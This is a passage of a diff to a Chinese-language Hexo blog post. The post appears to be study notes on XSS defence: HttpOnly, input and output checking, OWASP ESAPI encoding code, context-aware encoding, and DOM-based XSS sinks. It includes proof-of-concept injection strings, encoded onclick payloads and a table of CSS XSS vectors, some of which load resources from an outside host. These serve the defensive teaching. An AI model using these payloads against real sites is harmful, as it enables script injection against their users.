class="string">&quot;http://foo.bar&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    xmlHttp.<span class="title function_">send</span>();</span><br><span class="line">    xmlDoc = xmlHttp.<span class="property">responseText</span>;</span><br><span class="line">    <span class="title function_">alert</span>(xmlDoc);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">TYPE</span>=<span class="string">BUTTON</span> <span class="attr">OnClick</span>=<span class="string">&quot;sendTrace();&quot;</span> <span class="attr">VALUE</span>=<span class="string">&quot;Send Trace Request&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="输入输出验证"><a href="#输入输出验证" class="headerlink" title="输入输出验证"></a>输入输出验证</h4><p>一般是检查用户输入的数据中<strong>是否包含敏感数据</strong>，如<code>&lt;、&gt;、&#39;、”</code>等。如果发现存在特殊字符，则将这些字符过滤或者编码。比较智能的“输入检查”，可能还会匹配XSS的特征。比如查找用户数据中是否包含了<code>“&lt;script&gt;”、“javascript”</code>等敏感字符。这种输入检查的方式，可以称为“XSS Filter”。</p>
+<p><strong>输入检查</strong>的逻辑，<strong>必须放在服务器端代码中实现</strong>。如果只是在客户端使用JavaScript进行输入检查，是很容易被攻击者绕过的。目前Web开发的普遍做法，是同时在客户端JavaScript中和服务器端代码中实现相同的输入检查。客户端JavaScript的输入检查，可以阻挡大部分误操作的正常用户，从而节约服务器资源。</p>
+<p><strong>输出检查</strong>就是在变量输出到HTML页面上，可以使用编码或转义的方式来低于XSS攻击。</p>
+<h4 id="OWASP-ESAPI编码函数"><a href="#OWASP-ESAPI编码函数" class="headerlink" title="OWASP ESAPI编码函数"></a>OWASP ESAPI编码函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns backslash encoded numeric format. Does not use backslash character escapes</span></span><br><span class="line"><span class="comment"> * such as, \&quot; or \&#x27; as these may cause parsing problems. For example, if a javascript</span></span><br><span class="line"><span class="comment"> * attribute, such as onmouseover, contains a \&quot; that will close the entire attribute and</span></span><br><span class="line"><span class="comment"> * allow an attacker to inject another script attribute.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> <span class="variable">immune</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">immune是字符数组，即无需转义的安全字符，比如字母数字</span></span><br><span class="line"><span class="comment">c是需要编码的单个字符</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">public <span class="title class_">String</span> <span class="title function_">encodeCharacter</span>(<span class="params">char[] immune, Character c</span>) &#123;</span><br><span class="line">    <span class="comment">// check for immune characters</span></span><br><span class="line">    <span class="comment">// 检查输入字符c是否在immune数组中</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">containsCharacter</span>(c, immune)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span> + c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check for alphanumeric characters</span></span><br><span class="line">    <span class="comment">// 检查c是否是数字字母字符</span></span><br><span class="line">    <span class="title class_">String</span> hex = <span class="title class_">Codec</span>.<span class="title function_">getHexForNonAlphanumeric</span>(c);<span class="comment">//将非字母数字字符转换为16进制表示</span></span><br><span class="line">    <span class="keyword">if</span> (hex == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span> + c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do not use these shortcuts as they can be used to break out of a context</span></span><br><span class="line">    <span class="comment">// if (ch == 0x00) return &quot;\\0&quot;;</span></span><br><span class="line">    <span class="comment">// if (ch == 0x08) return &quot;\\b&quot;;</span></span><br><span class="line">    <span class="comment">// if (ch == 0x09) return &quot;\\t&quot;;</span></span><br><span class="line">    <span class="comment">// if (ch == 0x0a) return &quot;\\n&quot;;</span></span><br><span class="line">    <span class="comment">// if (ch == 0x0b) return &quot;\\v&quot;;</span></span><br><span class="line">    <span class="comment">// if (ch == 0x0c) return &quot;\\f&quot;;</span></span><br><span class="line">    <span class="comment">// if (ch == 0x0d) return &quot;\\r&quot;;</span></span><br><span class="line">    <span class="comment">// if (ch == 0x22) return &quot;\\\&quot;&quot;;</span></span><br><span class="line">    <span class="comment">// if (ch == 0x27) return &quot;\\&#x27;&quot;;</span></span><br><span class="line">    <span class="comment">// if (ch == 0x5c) return &quot;\\\\&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// encode up to 256 with \\xHH</span></span><br><span class="line">    <span class="comment">// 将字符c编码为安全的\xHH或\uHHH</span></span><br><span class="line">    <span class="title class_">String</span> temp = <span class="title class_">Integer</span>.<span class="title function_">toHexString</span>(c);<span class="comment">//将字符的Unicode值转为十六进制</span></span><br><span class="line">    <span class="keyword">if</span> (c &lt; <span class="number">256</span>) &#123;</span><br><span class="line">        <span class="title class_">String</span> pad = <span class="string">&quot;00&quot;</span>.<span class="title function_">substring</span>(temp.<span class="title function_">length</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\\x&quot;</span> + pad + temp.<span class="title function_">toUpperCase</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// otherwise encode with \\uHHHH</span></span><br><span class="line">    <span class="title class_">String</span> pad = <span class="string">&quot;0000&quot;</span>.<span class="title function_">substring</span>(temp.<span class="title function_">length</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\\u&quot;</span> + pad + temp.<span class="title function_">toUpperCase</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>除了HtmlEncode、JavascriptEncode外，还有许多用于各种情况的编码函数，比如XMLEncode（其实现与HtmlEncode类似）、JSONEncode（与JavascriptEncode类似）等。</p>
+<h3 id="只需一种编码吗"><a href="#只需一种编码吗" class="headerlink" title="只需一种编码吗?"></a>只需一种编码吗?</h3><p>XSS攻击主要发生在<strong>MVC架构中的View层</strong>。大部分的XSS漏洞可以在模板系统中解决。</p>
+<p>例如<strong>Python中的Django模板引擎</strong>(<code>&#123;&#123; var|escape &#125;&#125;</code>)为了防范XSS等安全风险，默认对HTML标签和特殊字符(如<code>&lt;,&gt;,&amp;</code>等)进行转义处理，在 Django 模板中，默认情况下，所有通过 {{ variable }} 输出的变量都会被<strong>自动转义</strong>（等同于应用了 <strong>escape 过滤器</strong>）。这种机制虽然有效提升了应用的安全性，但也可能导致开发者期望的HTML内容被错误地转义为文本。</p>
+<ul>
+<li><strong>python Django</strong>:模板语法 使用 {{ variable }} 展示变量，{% tag %} 执行逻辑（如循环、条件判断）过滤器:通过 <strong>|</strong> 管道符号对变量进行处理</li>
+</ul>
+<p>Django和web2py都选择在View层默认HtmlEncode所有变量以对抗XSS，出发点很好。但是，像web2py这样认为这就解决了XSS问题，是错误的观点。因为XSS很复杂，XSS防御的本质就是<strong>在正确的地方使用正确的编码方式</strong>。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;$var&#x27;); &quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>‘);</strong>：</p>
+<ul>
+<li>第一个单引号 ‘ 闭合 alert(‘ 的开始引号。</li>
+<li>分号 ; 结束 alert 语句。</li>
+<li>结果：跳出 alert(‘…’) 的字符串上下文，进入新的 JavaScript 语句。</li>
+</ul>
+<p>比如，我先进行HtmlEncode</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var = <span class="title function_">htmlencode</span>(<span class="string">&quot;&#x27;); alert(&#x27;2&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>对变量“$var”进行HtmlEncode后，渲染的结果是：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;<span class="symbol">&amp;#x27;</span> <span class="symbol">&amp;#x29;</span> <span class="symbol">&amp;#x3b;</span> alert<span class="symbol">&amp;#x28;</span> <span class="symbol">&amp;#x27;</span>2&#x27;); &quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对于浏览器来说，<strong>htmlparser会优先于JavaScript Parser执行</strong>，所以解析过程是，被<strong>HtmlEncode的字符先被解码</strong>，然<strong>后执行JavaScript事件。</strong></p>
+<p>因此，经过htmlparser解析后相当于：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;&#x27;); alert(&#x27;2&#x27;); &quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>导致XSS攻击发生的原因，是<strong>由于没有分清楚输出变量的语境</strong>，因此并非在模板引擎中使用了auto-escape就万事大吉了，XSS的防御需要区分情况对待。</p>
+<h2 id="正确防御"><a href="#正确防御" class="headerlink" title="正确防御"></a>正确防御</h2><p>XSS的本质是<strong>HTML注入</strong>，用户的数据被当作HTML代码来执行。如果网站使用了MVC架构，那么XSS就发生在View层—–在应用拼接变量到HTML页面时产生。所以在用户提交数据处进行输入检查的方案，其实并不是在真正发生攻击的地方做防御。</p>
+<ul>
+<li><p><strong>在HTML标签中输出</strong>，在这种场景下，XSS的利用方式一般是构造一个<code>&lt;script&gt;</code>标签，或者是任何能够产生脚本执行的方式。防御方法是HtmlEncode( <strong>HTML 中的特殊字符</strong> 转换为 <strong>浏览器不会执行的安全字符实体</strong>)</p>
+</li>
+<li><p><strong>在HTML属性中输出</strong>，与HTML标签中输出类似，防御方法是HtmlEncode.在OWASP ESAPI中推荐了一种更严格的HtmlEncode—<strong>除了字母、数字外，其他所有的特殊字符都被编码</strong>成HTMLEntities。</p>
+<p><code>String safe = ESAPI.encoder().encodeForHTMLAttribute( request.getParameter( &quot;input&quot; ) );</code></p>
+</li>
+<li><p><strong>在script标签中输出</strong>，是HTML嵌入或引用JavaScript代码的，攻击者需要先闭合引号才能实施XSS攻击，防御方法是使用JavascriptEncode(JS转义，将用户输入或不可信数据 <strong>安全地嵌入 JavaScript 代码中</strong> 的一种方式。)</p>
+</li>
+<li><p><strong>在事件中输出</strong>，和在<code>&lt;script&gt;</code>标签中输出类似，防御方法是JavascriptEncode</p>
+</li>
+<li><p><strong>在CSS输出</strong>，尽可能禁止用户可控制的变量”<code>&lt;style&gt;</code>标签”<strong>HTML标签的style属性</strong>”以及“<strong>CSS文件</strong>”中输出。如果一定有这样的需求，则推荐使用OWASP ESAPI中的encodeForCSS()函数。(除了字母、数字外的所有字符都被编码成十六进制形式“\uHH”。)</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>攻击类型</th>
+<th>CSS 属性 &#x2F; 标签</th>
+<th>浏览器特性</th>
+<th>防御方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>外部 CSS</td>
+<td><code>@import &#39;http://ha.ckers.org/xss.css&#39;;</code></td>
+<td>所有</td>
+<td>CSP、禁止用户控制 <code>&lt;style&gt;</code></td>
+</tr>
+<tr>
+<td>Firefox XBL</td>
+<td><code>BODY&#123;-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)&#125;</code></td>
+<td>Firefox</td>
+<td>CSP、禁用绑定</td>
+</tr>
+<tr>
+<td>IE HTC</td>
+<td><code>&lt;XSS STYLE=&quot;behavior: url(xss.htc); &quot;&gt;</code></td>
+<td>IE</td>
+<td>禁止用户控制 style、HTC 文件</td>
+</tr>
+<tr>
+<td>JS URL</td>
+<td>1.<code>li &#123;list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;); &#125;·</code>2.<code>&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</code></td>
+<td>所有</td>
+<td>白名单 URL、过滤 <code>javascript:</code></td>
+</tr>
+<tr>
+<td>IE 表达式</td>
+<td><code>&lt;DIV STYLE=&quot;width: expression(alert(&#39;XSS&#39;)); &quot;&gt;</code></td>
+<td>IE</td>
+<td>禁止 expression、CSP</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p><strong>在地址中输出</strong>,在地址中输出也比较复杂。一般来说，在URL的path（路径）或者search（参数）中输出，如果变量是整个url，这时URL的Protocal和Host部分是不能够使用URLEncode的，否则会改变URL的语义。检查变量是否是”http”开头，如果不是则进行添加，保证不会出现伪协议类的XSS攻击。在此之后再对其变量进行URLEncode。URLEncode会将 <strong>参数、路径部分</strong> 进行转义，字符转换为“%HH”形式，比如空格就是“%20”, “&lt;”符号是“%3c”。</p>
+</li>
+<li><p><strong>在富文本中</strong>，要通过“输入检查”的思路，通过白名单，避免使用黑名单，比如只允许**<code>&lt;a&gt;、&lt;img&gt;、&lt;div&gt;</code>等**比较安全的标签。在过滤富文本时，“事件”应该被严格禁止，因为“富文本”的展示需求里不应该包括“事件”这种动态效果。而一些危险的标签，比如<code>&lt;iframe&gt;、&lt;script&gt;、&lt;base&gt;、&lt;form&gt;</code>等，也是应该严格禁止的。</p>
+</li>
+<li><p>在<strong>DOM Based XSS</strong>是比较特殊的，DOM Based XSS是从JavaScript中输出数据到HTML页面里。而前文提到的方法都是针对“从服务器应用直接输出到HTML页面”的XSS漏洞，因此并不适用于DOM Based XSS。在“$var”输出到<code>&lt;script&gt;</code>时，应该执行一次javascriptEncode；其次，在document.write输出到HTML页面时，要分具体情况看待：<strong>如果是输出到事件或者脚本，则要再做一次javascriptEncode；如果是输出到HTML内容或者属性，则要做一次HtmlEncode。</strong></p>
+<ul>
+<li><p>会触发DOM Based XSS的地方有很多，以下几个地方是JavaScript输出到HTML页面的必经之路。</p>
+<p>❍ document.write()</p>
+<p>❍ document.writeln()</p>
+<p>❍ xxx.innerHTML &#x3D;</p>
+<p>❍ xxx.outerHTML &#x3D;</p>
+<p>❍ innerHTML.replace</p>
+<p>❍ document.attachEvent()</p>
+<p>❍ window.attachEvent()</p>
+<p>❍ document.location.replace()</p>
+<p>❍ document.location.assign()</p>
+<p>……</p>
+<p>需要重点关注这几个地方的参数是否可以被用户控制。除了服务器端直接输出变量到JavaScript外，还有以下几个地方可能会成为DOM Based XSS的输入点，也需要重点关注。</p>
+<p>❍ 页面中所有的inputs框</p>
+<p>❍ window.location(href、hash等)</p>
+<p>❍ window.name</p>
+<p>❍ document.referrer</p>
+<p>❍ document.cookie</p>
+<p>❍ localstorage</p>
+<p>❍ XMLHttpRequest返回的数据</p>
+<p>……</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="DOM-Based-XSS-javascriptEscape"><a href="#DOM-Based-XSS-javascriptEscape" class="headerlink" title="DOM Based XSS javascriptEscape"></a>DOM Based XSS javascriptEscape</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> x=<span class="string">&quot;\x20\x27onclick\x3dalert\x281\x29\x3b\x2f\x2f\x27&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+x+<span class="string">&quot;&#x27; &gt;test&lt;/a&gt;&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="执行流程："><a href="#执行流程：" class="headerlink" title="执行流程："></a>执行流程：</h4><ol>
+<li><code>javascriptEscape</code> 对 <code>$var</code> 编码成 <code>\xHH</code> JS 字符串</li>
+<li>浏览器执行 <code>&lt;script&gt;</code> → JS 变量 <code>x</code> 被解析，<code>\xHH</code> 解码成原始字符</li>
+<li><code>document.write</code> 输出 HTML：</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27; &#x27;</span>onclick=<span class="title function_">alert</span>(<span class="number">1</span>);<span class="comment">//&#x27;&gt;test&lt;/a&gt;</span></span><br><span class="line"><span class="number">4.</span>浏览器解析 <span class="variable constant_">HTML</span> → <span class="string">`onclick`</span> 属性被触发 → <span class="variable constant_">XSS</span> 执行</span><br></pre></td></tr></table></figure>
+
+<h3 id="DOM-Based-XSS-HtmlEncode"><a href="#DOM-Based-XSS-HtmlEncode" class="headerlink" title="DOM Based XSS HtmlEncode"></a>DOM Based XSS <strong>HtmlEncode</strong></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> x=<span class="string">&quot;1&amp;#x22; &amp;#x29; &amp;#x3b; alert&amp;#x28;2&amp;#x29; &amp;#x3b; &amp;#x2f; &amp;#x2f; &amp;#x22; &quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;a href=# onclick=&#x27;alert(\&quot;&quot;</span>+x+<span class="string">&quot;\&quot;)&#x27; &gt;test&lt;/a&gt;&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="执行流程：-1"><a href="#执行流程：-1" class="headerlink" title="执行流程："></a>执行流程：</h4><ol>
+<li><p>服务器端对 <code>$var</code> 做 <strong>HtmlEncode</strong> → HTML 实体</p>
+</li>
+<li><p>浏览器执行 <code>&lt;script&gt;</code> → HTML 实体被解码</p>
+<ul>
+<li><p>x 的内容变成：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&quot; ); alert(2); // &quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><code>document.write</code> 输出 HTML：</p>
+</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=# onclick=<span class="string">&#x27;alert(&quot;1&quot; ); alert(2); // &quot;)&#x27;</span>&gt;test&lt;/a&gt;</span><br><span class="line"><span class="number">4.</span>浏览器解析 <span class="string">`onclick`</span> 属性：</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>第一次 alert</strong>：原始 JS 内容 <code>&quot;1&quot;</code></li>
+<li><strong>第二次 alert</strong>：被 XSS 注入的 <code>alert(2)</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>第一个代码</th>
+<th>第二个代码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>编码方法</td>
+<td><code>javascriptEscape</code></td>
+<td><code>HtmlEncode</code></td>
+</tr>
+<tr>
+<td>变量所在上下文</td>
+<td>JS 字符串</td>
+<td>JS 字符串内 HTML 实体</td>
+</tr>
+<tr>
+<td>输出位置</td>
+<td>document.write 到 HTML</td>
+<td>document.write 到 HTML 属性 <code>onclick</code></td>
+</tr>
+<tr>
+<td>浏览器解析</td>
+<td>解码 JS escape → 生成 HTML</td>
+<td>解码 HTML 实体 → HTML 属性内的 JS 被执行</td>
+</tr>
+<tr>
+<td>XSS 弹窗次数</td>
+<td>1 次</td>
+<td>2 次（因为 HTML 实体解码后注入了新的 JS）</td>
+</tr>
+<tr>
+<td>原因</td>
+<td>JS escape 只保护 JS 字符串，但 HTML 上下文不安全</td>
+<td>HtmlEncode 保护 HTML，但 JS 字符串上下文不安全 → 属性解析时产生二次执行</td>
+</tr>
+</tbody></table>
 
     </div>
 
@@ -298,6 +598,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%BA%E5%A4%A7%E7%9A%84XSS-payload"><span class="nav-number">1.</span> <span class="nav-text">强大的XSS payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E5%BB%BA%E8%A1%A8%E5%8D%95"><span class="nav-number">1.0.1.</span> <span class="nav-text">构建表单</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%86%E5%88%AB%E7%94%A8%E6%88%B7%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="nav-number">1.0.2.</span> <span class="nav-text">识别用户浏览器</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E6%9E%84%E9%80%A0"><span class="nav-number">2.</span> <span class="nav-text">XSS构造</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BD%AC%E4%B9%89"><span class="nav-number">2.0.1.</span> <span class="nav-text">转义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81"><span class="nav-number">2.0.2.</span> <span class="nav-text">字符编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#location-hash%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="nav-number">2.0.3.</span> <span class="nav-text">location.hash可以绕过长度限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-number">2.0.4.</span> <span class="nav-text">注释符绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%87%E7%AD%BE"><span class="nav-number">2.0.5.</span> <span class="nav-text">&lt;base&gt;标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#window-name"><span class="nav-number">2.0.6.</span> <span class="nav-text">window.name</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-Expect-Header-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">HTTP Expect Header 注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E5%9B%9E%E6%97%8B%E9%95%96"><span class="nav-number">4.</span> <span class="nav-text">XSS回旋镖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flash-XSS"><span class="nav-number">5.</span> <span class="nav-text">Flash XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JavaScript%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6"><span class="nav-number">6.</span> <span class="nav-text">JavaScript开发框架</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E9%98%B2%E5%BE%A1"><span class="nav-number">7.</span> <span class="nav-text">XSS防御</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HttpOnly"><span class="nav-number">7.0.1.</span> <span class="nav-text">HttpOnly</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E9%AA%8C%E8%AF%81"><span class="nav-number">7.0.2.</span> <span class="nav-text">输入输出验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OWASP-ESAPI%E7%BC%96%E7%A0%81%E5%87%BD%E6%95%B0"><span class="nav-number">7.0.3.</span> <span class="nav-text">OWASP ESAPI编码函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AA%E9%9C%80%E4%B8%80%E7%A7%8D%E7%BC%96%E7%A0%81%E5%90%97"><span class="nav-number">7.1.</span> <span class="nav-text">只需一种编码吗?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E7%A1%AE%E9%98%B2%E5%BE%A1"><span class="nav-number">8.</span> <span class="nav-text">正确防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM-Based-XSS-javascriptEscape"><span class="nav-number">8.1.</span> <span class="nav-text">DOM Based XSS javascriptEscape</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="nav-number">8.1.1.</span> <span class="nav-text">执行流程：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM-Based-XSS-HtmlEncode"><span class="nav-number">8.2.</span> <span class="nav-text">DOM Based XSS HtmlEncode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%EF%BC%9A-1"><span class="nav-number">8.2.1.</span> <span class="nav-text">执行流程：</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -356,12 +657,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">0k</span>
+    <span title="站点总字数">16k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1 分钟</span>
+    <span title="站点阅读时长">14 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
